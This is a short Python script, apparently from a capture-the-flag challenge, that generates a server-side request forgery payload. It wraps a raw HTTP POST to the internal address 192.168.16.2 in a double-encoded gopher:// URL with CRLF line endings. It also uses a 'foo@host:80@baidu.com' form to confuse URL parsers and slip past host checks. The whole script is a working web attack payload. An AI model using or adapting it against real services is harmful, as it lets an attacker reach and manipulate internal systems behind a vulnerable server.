import urllib
import requests

payload = "check=NeSE"

exp='''POST / HTTP/1.1
Host: 192.168.16.2
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: {}

{}'''.format(len(payload), payload)
# print exp.split("\n")
tmp = urllib.parse.quote(exp)
tmp = tmp.replace("%0A","%0D%0A")
 
result = "_"+urllib.parse.quote(tmp)

result="gopher://foo@192.168.16.2:80@baidu.com/"+result
print(result)
